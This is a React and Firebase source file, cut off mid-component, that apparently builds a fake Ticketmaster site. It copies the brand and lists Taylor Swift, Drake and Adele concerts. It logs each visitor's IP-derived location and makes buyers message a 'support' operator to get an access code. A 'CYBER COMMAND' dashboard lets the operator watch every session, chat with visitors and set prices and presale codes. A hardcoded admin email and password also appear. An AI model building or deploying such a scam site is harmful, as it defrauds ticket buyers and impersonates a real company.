import React, { useState, useEffect, useRef } from 'react';
import { 
  Search, User, CheckCircle, MessageSquare, Send, X, Bell, 
  DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, 
  Lock, Globe, Zap, Users, Activity, CreditCard, Wallet, 
  Eye, Settings, Layout, MousePointer2, AlertTriangle, RefreshCcw,
  Navigation
} from 'lucide-react';
import { initializeApp } from 'firebase/app';
import { 
  getFirestore, collection, addDoc, updateDoc, doc, 
  setDoc, getDoc, onSnapshot, query, orderBy 
} from 'firebase/firestore';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';

// --- SYSTEM INITIALIZATION ---
const firebaseConfig = JSON.parse(__firebase_config);
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);
const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';

// ADMIN SECURITY (Fallback)
const ADMIN_ID = "buyticketsmaster.org@gmail.com"; 
const ADMIN_PASS = "Ifeoluwapo@1!";

const INITIAL_EVENTS = [
  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", status: "presale", timeRemaining: "02:45:12" },
  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", status: "available", timeRemaining: "00:00:00" },
  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", status: "low_inventory", timeRemaining: "05:12:00" }
];

// ==========================================================================================
// MAIN APP COMPONENT (CONTROLLER)
// ==========================================================================================
export default function App() {
  const [user, setUser] = useState(null);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cart, setCart] = useState([]); 
  const [sessions, setSessions] = useState([]); 
  const [currentSessionId, setCurrentSessionId] = useState(null);
  const [globalSettings, setGlobalSettings] = useState({ price: 250, presaleCode: 'FAN2024' });
  
  // UI & States
  const [searchTerm, setSearchTerm] = useState('');
  const [authStep, setAuthStep] = useState('email'); 
  const [authMode, setAuthMode] = useState('login'); 
  const [tempUser, setTempUser] = useState({ email: '', name: '' });
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [activeNotification, setActiveNotification] = useState(null);
  const [showMemberInfo, setShowMemberInfo] = useState(false);
  const [showNotifPanel, setShowNotifPanel] = useState(false);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);

  // Admin Inputs
  const [adminUserInp, setAdminUserInp] = useState('');
  const [adminPassInp, setAdminPassInp] = useState('');

  // Messenger Toggle
  const isMessengerMode = new URLSearchParams(window.location.search).get('messenger') === 'true';

  // --- BOOTSTRAP FIREBASE ---
  useEffect(() => {
    const init = async () => {
      try { await signInAnonymously(auth); } catch (e) { console.error(e); }
    };
    init();
    return onAuthStateChanged(auth, setUser);
  }, []);

  // --- SESSION ENGINE ---
  useEffect(() => {
    if (!user || isMessengerMode) return;
    const createSession = async () => {
      let location = "Detecting...";
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        location = `${data.city}, ${data.country_name}`;
      } catch (e) { location = "Secure Link"; }

      const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
      const newDoc = await addDoc(sessionsRef, {
        createdAt: new Date().toISOString(),
        lastActive: new Date().toISOString(),
        userId: user.uid,
        location,
        status: 'browsing',
        email: 'Anonymous',
        userAuthCode: '', 
        notifications: [],
        hasNewMessage: false,
        isVerifying: false,
        chatHistory: [{ sender: 'system', text: 'Welcome to Support. Your connection is encrypted. How can we verify your fan status today?', timestamp: new Date().toISOString() }]
      });
      setCurrentSessionId(newDoc.id);
    };
    createSession();
  }, [user, isMessengerMode]);

  // --- GLOBAL SETTINGS SYNC ---
  useEffect(() => {
    if (!user) return;
    const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
    return onSnapshot(configRef, (snap) => {
      if (snap.exists()) setGlobalSettings(snap.data());
      else setDoc(configRef, { price: 250, presaleCode: 'FAN2024' });
    });
  }, [user]);

  // --- MESSENGER SYNC ---
  useEffect(() => {
    if (!user || !isMessengerMode) return;
    const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
    return onSnapshot(sessionsRef, (snap) => {
      const all = snap.docs.map(d => ({ id: d.id, ...d.data() }));
      setSessions(all.sort((a, b) => new Date(b.lastActive) - new Date(a.lastActive)));
    });
  }, [user, isMessengerMode]);

  // --- VISITOR CHAT SYNC ---
  useEffect(() => {
    if (!currentSessionId || isMessengerMode) return;
    const sessionRef = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId);
    return onSnapshot(sessionRef, (snap) => {
      if (snap.exists()) {
        const d = snap.data();
        if (d.chatHistory) setChatMessages(d.chatHistory);
        if (d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length - 1]);
      }
    });
  }, [currentSessionId, isMessengerMode]);

  // --- ACTIONS ---
  const updateSession = async (sid, updates) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    await updateDoc(ref, { ...updates, lastActive: new Date().toISOString() });
  };

  const sendChatMessage = async (sid, text, sender) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const chat = snap.data().chatHistory || [];
      const updates = { 
        chatHistory: [...chat, { sender, text, timestamp: new Date().toISOString() }],
        lastActive: new Date().toISOString()
      };
      if (sender === 'user') updates.hasNewMessage = true;
      await updateDoc(ref, updates);
    }
  };

  const handleAdminLogin = () => {
    const u = adminUserInp.trim();
    const p = adminPassInp.trim();
    if (u === ADMIN_ID && p === ADMIN_PASS) {
      setIsAdminLoggedIn(true);
      setAdminUserInp('');
      setAdminPassInp('');
    } else {
      alert("Invalid Security Credentials");
    }
  };

  const filteredEvents = INITIAL_EVENTS.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
  const mySessionData = sessions.find(s => s.id === currentSessionId) || {};

  // ==========================================
  // RENDER: MESSENGER DASHBOARD (The separate App)
  // ==========================================
  if (isMessengerMode) {
    return (
      <MessengerView 
        sessions={sessions} updateSession={updateSession} 
        sendChatMessage={sendChatMessage} globalSettings={globalSettings}
        updateGlobalSettings={(s) => setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), s)}
        isLive={!!user}
      />
    );
  }

  // ==========================================
  // RENDER: PREMIUM CUSTOMER EXPERIENCE
  // ==========================================
  return (
    <div className="min-h-screen font-sans text-gray-900 bg-[#0a0e14] relative overflow-x-hidden no-select">
      
      {/* 1. PREMIUM HEADER */}
      <header className="fixed top-0 w-full z-[300] bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between border-b border-white/5 shadow-2xl backdrop-blur-3xl bg-opacity-95">
        <div className="flex items-center gap-4">
          {currentPage !== 'home' && (
            <button onClick={() => setCurrentPage('home')} className="p-2.5 rounded-full hover:bg-white/10 transition-all active:scale-75"><ChevronLeft className="w-6 h-6" /></button>
          )}
          <div className="flex items-center gap-1 cursor-pointer shrink-0" onClick={() => setCurrentPage('home')}>
            <span className="font-bold text-2xl tracking-tighter uppercase italic">ticketmaster</span>
            <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center shadow-[0_0_20px_#026cdf]">
              <CheckCircle className="w-3.5 h-3.5 text-white stroke-[3]" />
            </div>
          </div>
        </div>

        {/* Global Linked Search */}
        <div className="hidden md:flex flex-1 max-w-lg mx-12 relative group">
          <input 
            type="text" placeholder="Search millions of live experiences..." 
            className="w-full bg-white/5 border border-white/10 rounded-full py-2.5 pl-11 pr-4 text-sm focus:bg-white focus:text-gray-900 outline-none transition-all duration-300"
            value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)}
          />
          <Search className="absolute left-4 top-3 w-4 h-4 text-gray-500 group-focus-within:text-[#026cdf]" />
        </div>

        <div className="flex items-center gap-6">
          <button 
            onClick={() => {setShowMemberInfo(!showMemberInfo); setShowNotifPanel(false);}}
            className="flex items-center gap-2 text-[10px] font-black text-[#026cdf] bg-blue-500/10 px-4 py-2 rounded-full border border-blue-500/20 shadow-inner hover:bg-blue-500/20 transition-all active:scale-95"
          >
            <Star className="w-3.5 h-3.5 fill-current animate-pulse" />
            <span className="hidden sm:inline uppercase tracking-widest">Verified Fan</span>
          </button>

          <button className="relative p-2.5 hover:scale-110 transition-transform active:scale-90" onClick={() => {setShowNotifPanel(!showNotifPanel); setShowMemberInfo(false);}}>
            <Bell className="w-6.5 h-6.5" />
            {(activeNotification || showNotifPanel) && <div className="absolute top-2 right-2 w-4 h-4 bg-red-600 rounded-full border-2 border-[#1f262d] animate-bounce shadow-lg" />}
          </button>

          <button onClick={() => setCurrentPage('admin')} className="p-2.5 hover:text-[#026cdf] transition-all"><User className="w-6.5 h-6.5" /></button>
        </div>

        {/* Member Panel Overlays */}
        {showMemberInfo && (
          <div className="absolute top-14 right-4 w-72 bg-white text-gray-900 rounded-[40px] p-8 shadow-[0_60px_120px_rgba(0,0,0,0.6)] border border-gray-100 animate-slideDown z-[400]">
            <h4 className="font-black text-xs uppercase tracking-widest text-[#026cdf] mb-5 text-center italic">Account Identity</h4>
            <div className="bg-blue-50 p-6 rounded-[30px] border-2 border-blue-100 flex items-center gap-4 shadow-inner">
              <ShieldCheck className="text-[#026cdf] w-8 h-8" />
              <p className="text-[10px] font-bold leading-tight uppercase tracking-tight">Status:<br/><span className="text-[#026cdf] text-xs font-black italic tracking-widest uppercase">AUTHENTICATED</span></p>
            </div>
            <p className="text-[9px] text-gray-400 mt-6 leading-relaxed font-black uppercase tracking-tighter text-center italic leading-relaxed">Protected by Ticketmaster Shield™ Multi-Layer security.</p>
          </div>
        )}

        {showNotifPanel && (
          <div className="absolute top-14 right-4 w-80 bg-[#1f262d] text-white rounded-[40px] p-8 shadow-[0_60px_120px_rgba(0,0,0,0.6)] border border-white/10 animate-slideDown z-[400]">
            <div className="flex justify-between items-center mb-8 italic">
               <h4 className="font-black text-xs uppercase tracking-widest text-gray-500">Official Inbox</h4>
               <X className="w-4 h-4 cursor-pointer text-gray-600" onClick={() => setShowNotifPanel(false)} />
            </div>
            {activeNotification ? (
               <div className="bg-[#026cdf] p-6 rounded-[30px] shadow-2xl animate-pulse border-b-4 border-blue-900">
                  <p className="text-[11px] font-black leading-tight uppercase mb-2 tracking-widest italic opacity-70">Security Pulse</p>
                  <p className="text-xs font-bold leading-relaxed">{activeNotification.text}</p>
               </div>
            ) : (
               <div className="text-center py-16 opacity-10">
                  <Bell className="mx-auto w-12 h-12 mb-4" />
                  <p className="text-[11px] font-black uppercase tracking-[0.4em]">Signal Stable</p>
               </div>
            )}
          </div>
        )}
      </header>

      {/* 2. MAIN VIEWPORT */}
      <main className="pt-16 min-h-screen relative z-10">
        {currentPage === 'home' && <HomeView events={filteredEvents} searchTerm={searchTerm} setSearchTerm={setSearchTerm} onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} />}
        {currentPage === 'auth' && <AuthView mode={authMode} setMode={setAuthMode} step={authStep} setStep={setAuthStep} tempUser={tempUser} setTempUser={setTempUser} sessionData={mySessionData} onComplete={() => { setCurrentPage('seatmap'); updateSession(currentSessionId, { status: 'viewing_map', email: tempUser.email }); }} />}
        {currentPage === 'seatmap' && <SeatMapView event={selectedEvent} presaleCode={globalSettings.presaleCode} cart={cart} setCart={setCart} globalPrice={globalSettings.price} onCheckout={() => { updateSession(currentSessionId, { status: 'pending_checkout', cart }); setCurrentPage('checkout'); }} />}
        {currentPage === 'checkout' && <CheckoutView cart={cart} sessionId={currentSessionId} sessionData={mySessionData} updateSession={updateSession} onSuccess={() => setCurrentPage('success')} onBack={() => setCurrentPage('seatmap')} />}
        {currentPage === 'success' && <SuccessView event={selectedEvent} cart={cart} onHome={() => setCurrentPage('home')} />}
        {currentPage === 'admin' && (
          <div className="min-h-[90vh] bg-[#f1f5f9] flex items-center justify-center p-6 italic">
            {!isAdminLoggedIn ? (
              <div className="bg-white p-16 rounded-[80px] w-full max-w-sm shadow-[0_80px_150px_rgba(0,0,0,0.15)] border-4 border-white animate-slideUp space-y-12">
                <div className="text-center space-y-3">
                   <div className="w-24 h-24 bg-blue-50 rounded-[45px] flex items-center justify-center mx-auto mb-6 shadow-inner"><Lock className="text-[#026cdf] w-12 h-12" /></div>
                   <h2 className="text-5xl font-black italic uppercase tracking-tighter">War Room</h2>
                   <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest leading-none">Authorization Portal</p>
                </div>
                <div className="space-y-4">
                   <input placeholder="Admin ID" className="border-4 border-gray-50 bg-gray-50/50 w-full p-6 rounded-[35px] outline-none font-bold focus:border-[#026cdf] focus:bg-white transition-all italic shadow-inner" value={adminUserInp} onChange={e=>setAdminUserInp(e.target.value)}/>
                   <input type="password" placeholder="Passkey" className="border-4 border-gray-50 bg-gray-50/50 w-full p-6 rounded-[35px] outline-none font-bold focus:border-[#026cdf] focus:bg-white transition-all italic shadow-inner" value={adminPassInp} onChange={e=>setAdminPassInp(e.target.value)}/>
                   <button onClick={handleAdminLogin} className="w-full bg-[#026cdf] text-white py-8 rounded-[40px] font-black shadow-3xl uppercase tracking-widest mt-8 hover:bg-blue-600 active:scale-95 transition-all text-xl italic shadow-blue-500/50">Authenticate</button>
                </div>
              </div>
            ) : (
              <div className="text-center space-y-8 animate-fadeIn">
                 <h2 className="text-5xl font-black uppercase tracking-tighter">Satellite Linked</h2>
                 <button onClick={() => window.location.href='?messenger=true'} className="bg-[#026cdf] text-white px-20 py-8 rounded-[50px] font-black text-2xl uppercase tracking-widest shadow-2xl italic hover:scale-110 active:scale-90 transition-all">Launch Messenger Dashboard</button>
                 <p className="text-gray-400 font-black uppercase tracking-[0.6em]">Encrypted Session Active</p>
              </div>
            )}
          </div>
        )}
      </main>

      {/* 3. PREMIUM SUPPORT CHAT OVERLAY */}
      <div className={`fixed bottom-10 right-10 z-[200] transition-all duration-700 ${currentPage === 'seatmap' || currentPage === 'checkout' ? 'translate-y-[-100px] sm:translate-y-0' : ''}`}>
        <button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] text-white p-7 rounded-[35px] shadow-[0_40px_100px_rgba(2,108,223,0.6)] hover:scale-110 active:scale-90 transition-all border-4 border-white/10 relative group">
          {isChatOpen ? <X className="w-10 h-10" /> : <MessageSquare className="w-10 h-10 group-hover:rotate-12 transition-transform" />}
          {mySessionData.notifications?.length > 0 && !isChatOpen && <div className="absolute -top-2 -right-2 w-6 h-6 bg-red-600 rounded-full border-4 border-[#0a0e14] animate-ping" />}
        </button>
      </div>

      {isChatOpen && (
        <div className="fixed bottom-36 right-10 w-[94vw] max-w-[400px] h-[600px] bg-white border shadow-[0_50px_200px_rgba(0,0,0,0.6)] rounded-[65px] z-[210] flex flex-col overflow-hidden animate-slideUp border-8 border-white">
          <div className="bg-[#1f262d] text-white p-10 flex justify-between items-center border-b border-white/5 relative">
            <div className="flex items-center gap-6">
              <div className="relative">
                <div className="w-16 h-16 bg-gradient-to-br from-[#026cdf] to-blue-900 rounded-[28px] flex items-center justify-center font-black text-2xl italic shadow-2xl border-2 border-white/10">TM</div>
                <div className="absolute bottom-0 right-0 w-5 h-5 bg-green-500 rounded-full border-4 border-[#1f262d] animate-pulse" />
              </div>
              <div>
                <div className="flex items-center gap-3">
                   <span className="font-black text-2xl tracking-tighter uppercase italic">ticketmaster</span>
                   <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center shadow-lg shadow-blue-500/50"><CheckCircle className="w-3.5 h-3.5 text-white" /></div>
                </div>
                <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest italic mt-1 leading-none">Global Support Stream Verified</p>
              </div>
            </div>
            <X className="cursor-pointer text-gray-600 hover:text-white transition-colors" onClick={() => setIsChatOpen(false)} />
          </div>
          <div className="flex-1 overflow-y-auto p-10 space-y-8 bg-gray-50/50 scroll-pro italic">
            {chatMessages.map((m, i) => (
              <div key={i} className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                <div className={`max-w-[85%] p-6 rounded-[35px] text-[15px] font-bold shadow-2xl leading-relaxed ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none shadow-blue-500/30' : 'bg-white border-2 border-gray-100 rounded-bl-none text-gray-800 italic'}`}>{m.text}</div>
              </div>
            ))}
          </div>
          <div className="p-8 border-t-2 border-gray-100 bg-white flex gap-5">
            <input id="v-chat-box" placeholder="Write to agent..." className="flex-1 bg-gray-100 border-none p-6 rounded-[35px] font-bold focus:ring-8 focus:ring-blue-500/10 outline-none transition-all italic text-lg" onKeyDown={(e) => { if(e.key === 'Enter' && e.target.value.trim()){ sendChatMessage(currentSessionId, e.target.value, 'user'); e.target.value = ''; } }} />
            <button onClick={() => { const i = document.getElementById('v-chat-box'); if(i.value.trim()){ sendChatMessage(currentSessionId, i.value, 'user'); i.value = ''; } }} className="bg-[#026cdf] text-white p-6 rounded-[35px] shadow-3xl hover:bg-blue-700 active:scale-90 transition-all shadow-blue-500/40"><Send className="w-8 h-8" /></button>
          </div>
        </div>
      )}
    </div>
  );
}

// ==========================================
// VIEWS: SITE MODULES
// ==========================================

function HomeView({ events, searchTerm, setSearchTerm, onSelect }) {
  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-16 space-y-24 pb-48 relative">
      <div className="relative h-[650px] rounded-[110px] overflow-hidden shadow-[0_100px_200px_rgba(0,0,0,0.8)] flex flex-col items-center justify-center p-14 text-center border-8 border-white/5 group">
        <div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-[#0a0e14]/60 to-transparent z-10" />
        <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover transition-transform duration-[40s] group-hover:scale-125 opacity-70" alt="Hero" />
        <div className="relative z-20 text-white max-w-6xl animate-fadeIn space-y-12 pb-24">
          <h1 className="text-7xl md:text-[13rem] font-black tracking-tighter leading-none italic uppercase drop-shadow-[0_30px_90px_rgba(0,0,0,1)]">LET'S MAKE <span className="text-[#026cdf] drop-shadow-[0_0_80px_rgba(2,108,223,0.9)]">MEMORIES</span>.</h1>
          <p className="text-2xl md:text-5xl font-black text-gray-300 opacity-95 max-w-3xl mx-auto italic tracking-tighter uppercase leading-tight italic">Verified access to the world's most elite live events.</p>
        </div>
        <div className="relative z-30 w-full max-w-2xl mt-[-80px]">
          <div className="bg-white/10 backdrop-blur-3xl border-4 border-white/20 rounded-[70px] p-4 flex shadow-[0_60px_120px_rgba(0,0,0,0.9)] group focus-within:bg-white transition-all duration-700">
             <input className="flex-1 bg-transparent px-10 py-7 rounded-full text-white font-black placeholder:text-white/30 focus:outline-none focus:text-gray-950 text-2xl italic" placeholder="Find elite tour access..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
             <button className="bg-[#026cdf] px-20 py-7 rounded-[50px] font-black text-2xl uppercase tracking-widest shadow-2xl hover:bg-blue-600 transition-all active:scale-95 italic text-white shadow-blue-500/50">GO</button>
          </div>
        </div>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-20">
        {events.map(ev => (
          <div key={ev.id} onClick={() => onSelect(ev)} className="bg-[#1f262d] rounded-[90px] overflow-hidden shadow-[0_60px_150px_rgba(0,0,0,0.5)] border-4 border-white/5 hover:translate-y-[-35px] transition-all duration-1000 cursor-pointer group hover:border-[#026cdf]/50">
            <div className="h-[500px] relative overflow-hidden"><img src={ev.image} className="w-full h-full object-cover group-hover:scale-150 transition-transform duration-[12s]" alt={ev.artist} /><div className="absolute inset-0 bg-gradient-to-t from-[#1f262d] via-transparent to-transparent opacity-95" /><div className="absolute top-14 left-14 flex flex-col gap-6"><div className="bg-[#ea0042] text-white px-10 py-4 rounded-full text-[13px] font-black uppercase shadow-3xl animate-pulse tracking-widest border border-white/10 italic">Selling Fast</div>{ev.timeRemaining !== "00:00:00" && <div className="bg-black/60 backdrop-blur-2xl text-white px-8 py-3 rounded-full text-[12px] font-black uppercase border border-white/10 tracking-[0.4em] shadow-2xl italic leading-none">Starts: {ev.timeRemaining}</div>}</div></div>
            <div className="p-20 space-y-14"><h3 className="text-6xl font-black leading-none text-white group-hover:text-[#026cdf] transition-all uppercase italic tracking-tighter italic">{ev.artist}</h3><div className="pt-14 border-t-4 border-white/5 flex justify-between items-center"><div className="flex items-center gap-5"><div className="w-14 h-14 rounded-[22px] bg-[#026cdf]/10 flex items-center justify-center border-2 border-[#026cdf]/20 shadow-inner"><ShieldCheck className="w-8 h-8 text-[#026cdf]" /></div><span className="text-[15px] font-black uppercase text-[#026cdf] tracking-[0.5em] italic">Official</span></div><div className="bg-white/5 p-7 rounded-full group-hover:bg-[#026cdf] group-hover:text-white transition-all scale-125 shadow-2xl"><ChevronLeft className="w-8 h-8 rotate-180" /></div></div></div>
          </div>
        ))}
      </div>
    </div>
  );
}

function AuthView({ mode, setMode, step, setStep, tempUser, setTempUser, sessionData, onComplete }) {
  const [loading, setLoading] = useState(false);
  const [vCode, setVCode] = useState('');
  const [error, setError] = useState('');
  const next = () => { setLoading(true); setError(''); setTimeout(() => { setLoading(false); if(step==='email') setStep(mode==='login' ? 'verify' : 'signup'); else if(step==='signup') setStep('verify'); else { if (vCode.trim() === sessionData.userAuthCode && vCode.trim() !== '') onComplete(); else setError("Authorization Access Denied. Contact Official Stream."); } }, 2000); };
  return (
    <div className="min-h-[85vh] flex items-center justify-center p-6 bg-[#0a0e14]/80 italic"><div className="bg-white w-full max-w-lg rounded-[100px] shadow-[0_120px_250px_rgba(0,0,0,1)] p-20 border-8 border-white space-y-20 animate-slideUp relative overflow-hidden"><div className="absolute top-16 right-20 flex gap-12 text-[14px] font-black uppercase tracking-[0.5em] italic opacity-40"><button onClick={() => {setMode('login'); setStep('email');}} className={mode==='login' ? 'text-[#026cdf] opacity-100 underline underline-offset-[12px]' : ''}>Login</button><button onClick={() => {setMode('signup'); setStep('email');}} className={mode==='signup' ? 'text-[#026cdf] opacity-100 underline underline-offset-[12px]' : ''}>Join</button></div><div className="text-center pt-16"><div className="w-40 h-40 bg-blue-50 rounded-[65px] flex items-center justify-center mx-auto mb-10 shadow-inner border-4 border-blue-100 animate-pulse"><User className="text-[#026cdf] w-20 h-20" /></div><h2 className="text-7xl font-black tracking-tighter uppercase italic">{mode === 'login' ? 'Welcome' : 'Join Fan'}</h2><p className="text-gray-400 text-[14px] font-black uppercase tracking-[0.8em] mt-8 opacity-40 italic leading-none">Security Tunnel Active</p></div>
    {step === 'email' && (<div className="space-y-12"><input className="w-full border-8 border-gray-100 bg-gray-50/50 p-10 rounded-[45px] font-black focus:border-[#026cdf] focus:bg-white transition-all text-3xl italic shadow-inner outline-none" placeholder="Email Address" value={tempUser.email} onChange={e=>setTempUser({...tempUser, email:e.target.value})} /><button onClick={next} className="w-full bg-[#026cdf] text-white py-10 rounded-[50px] font-black shadow-3xl uppercase tracking-widest text-2xl italic shadow-blue-500/60 hover:translate-y-[-10px] active:translate-y-0 transition-all scale-105">Initiate Tunnel</button></div>)}
    {step === 'signup' && (<div className="space-y-8 animate-fadeIn"><input className="w-full border-8 border-gray-100 bg-gray-50 p-10 rounded-[45px] font-black outline-none italic text-2xl shadow-inner" placeholder="Legal Identity Name" value={tempUser.name} onChange={e=>setTempUser({...tempUser, name:e.target.value})} /><input className="w-full border-8 border-gray-100 bg-gray-50 p-10 rounded-[45px] font-black outline-none italic text-2xl shadow-inner" type="password" placeholder="Account Passkey" /><button onClick={next} className="w-full bg-black text-white py-10 rounded-[50px] font-black shadow-2xl uppercase tracking-widest text-2xl italic hover:scale-105 transition-all">Build Profile</button></div>)}
    {step === 'verify' && (<div className="space-y-16 animate-fadeIn"><div className="bg-[#026cdf]/5 p-12 rounded-[60px] border-8 border-dashed border-[#026cdf]/20 text-center shadow-inner"><p className="text-[16px] text-[#026cdf] font-black leading-relaxed uppercase tracking-[0.4em] italic">Identity Match Required.<br/>Message Support to receive your 6-digit access code.</p></div><div className="space-y-8 text-center"><input className={`w-full border-[12px] p-12 rounded-[60px] text-center font-black tracking-[1.4em] text-7xl outline-none transition-all shadow-inner ${error ? 'border-red-500 bg-red-50 text-red-600' : 'border-gray-100 bg-gray-50 focus:bg-white'}`} placeholder="0000" value={vCode} onChange={e=>setVCode(e.target.value)} maxLength={6} />{error && <p className="text-red-600 text-[14px] font-black uppercase tracking-widest animate-shake italic text-center">{error}</p>}</div><button onClick={next} className="w-full bg-[#026cdf] text-white py-10 rounded-[50px] font-black shadow-3xl hover:scale-[1.1] active:scale-95 transition-all uppercase tracking-[0.4em] italic text-3xl shadow-blue-500/70">Verify Access</button></div>)}
    </div></div>
  );
}

// ==========================================
// VIEW: DEDICATED ADMIN MESSENGER (THE CONTROL APP)
// ==========================================

function MessengerView({ sessions, updateSession, sendChatMessage, globalSettings, updateGlobalSettings, isLive }) {
  const [selectedSid, setSelectedSid] = useState(null);
  const [localConfig, setLocalConfig] = useState(globalSettings);
  const activeT = sessions.find(s => s.id === selectedSid);
  const needingAlertCount = sessions.filter(s => s.hasNewMessage || s.status === 'browsing').length;

  return (
    <div className="min-h-screen bg-[#0a0e14] flex flex-col md:flex-row h-screen overflow-hidden italic no-select text-gray-100 font-sans">
      <div className="w-full md:w-[450px] bg-[#1f262d] border-r border-white/5 flex flex-col shadow-[30px_0_90px_rgba(0,0,0,0.7)] z-20">
        <div className="p-12 bg-gradient-to-br from-[#1f262d] to-black border-b border-white/5 shadow-2xl flex justify-between items-center relative overflow-hidden">
           <div className="space-y-2 relative z-10">
              <h1 className="text-4xl font-black italic tracking-tighter text-[#026cdf] drop-shadow-[0_0_20px_#026cdf]">CYBER COMMAND</h1>
              <div className="flex items-center gap-3"><div className={`w-3 h-3 rounded-full ${isLive ? 'bg-green-500 shadow-[0_0_20px_#22c55e] animate-pulse' : 'bg-red-500'}`} /><p className="text-[11px] font-black uppercase tracking-[0.5em] text-gray-400 italic">Satellite Active</p></div>
           </div>
           <Users className="w-16 h-16 opacity-10 absolute right-8 top-10" />
        </div>
        <div className="flex-1 overflow-y-auto bg-black/40 scroll-pro p-4">
           {sessions.length === 0 ? (
             <div className="p-24 text-center opacity-30 flex flex-col items-center italic"><Activity className="w-24 h-24 mb-10 animate-pulse text-[#026cdf]" /><p className="text-[15px] font-black uppercase tracking-[0.8em] leading-relaxed">Scanning Perimeter...</p></div>
           ) : sessions.map(s => {
             const sel = selectedSid === s.id;
             const alert = s.hasNewMessage;
             return (
               <div key={s.id} onClick={() => { setSelectedSid(s.id); if(s.hasNewMessage) updateSession(s.id, {hasNewMessage: false}); }}
                 className={`p-12 border-b border-white/5 cursor-pointer transition-all duration-700 relative group mb-2 ${sel ? 'bg-gradient-to-r from-[#026cdf] to-blue-950 shadow-3xl translate-x-6 rounded-l-[50px] border-l-8 border-white' : 'hover:bg-white/5 rounded-[40px]'}`}
               >
                  <div className="flex justify-between items-start mb-6 italic">
                     <p className="font-black text-xl uppercase tracking-tighter truncate max-w-[220px]">{s.name || 'Visitor Unidentified'}</p>
                     <p className={`text-[11px] font-black px-5 py-2 rounded-full uppercase tracking-widest shadow-2xl ${sel ? 'bg-white text-[#026cdf]' : 'bg-blue-600/20 text-blue-400 border border-blue-500/20'}`}>{s.status}</p>
                  </div>
                  <div className="flex items-center gap-4"><Globe className={`w-5 h-5 ${sel ? 'opacity-100' : 'opacity-30'}`} /><p className={`text-[14px] font-black uppercase tracking-[0.4em] truncate ${sel ? 'text-white' : 'text-gray-500'}`}>{s.location}</p></div>
                  {alert && !sel && <div className="absolute right-8 top-1/2 -translate-y-1/2 w-6 h-6 bg-red-600 rounded-full shadow-[0_0_30px_#ea0042] animate-ping" />}
               </div>
             );
           })}
        </div>
        <div className="p-12 bg-black/60 border-t border-white/10 space-y-10">
           <div className="flex items-center justify-between"><p className="text-[12px] font-black uppercase text-gray-500 tracking-[0.6em] italic">Command Override</p><Zap className="w-5 h-5 text-amber-500 animate-bounce" /></div>
           <div className="space-y-8"><div className="flex gap-6">
              <div className="flex-1"><label className="text-[10px] font-black uppercase text-gray-500 mb-3 block tracking-widest italic">Base $</label><input type="number" className="w-full bg-[#1f262d] border-4 border-white/5 p-5 rounded-[30px] text-2xl font-black outline-none focus:border-[#026cdf] transition-all italic" value={localConfig.price} onChange={e=>setLocalConfig({...localConfig, price: Number(e.target.value)})} /></div>
              <div className="flex-1"><label className="text-[10px] font-black uppercase text-gray-500 mb-3 block tracking-widest italic">Code</label><input className="w-full bg-[#1f262d] border-4 border-white/5 p-5 rounded-[30px] text-2xl font-black uppercase outline-none focus:border-[#026cdf] transition-all italic" value={localConfig.presaleCode} onChange={e=>setLocalConfig({...localConfig, presaleCode: e.target.value.toUpperCase()})} /></div>
           </div><button onClick={() => updateGlobalSettings(localConfig)} className="w-full bg-[#026cdf] text-white py-8 rounded-[40px] font-black text-[15px] uppercase shadow-[0_30px_60px_rgba(2,108,223,0.4)] hover:bg-blue-600 transition-all active:scale-95 italic tracking-[0.4em]">Apply Global Encryption</button></div>
        </div>
      </div>

      <div className="flex-1 flex flex-col bg-[#0a0e14] relative"><div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/dark-matter.png')] opacity-10 pointer-events-none" />
        {activeT ? (
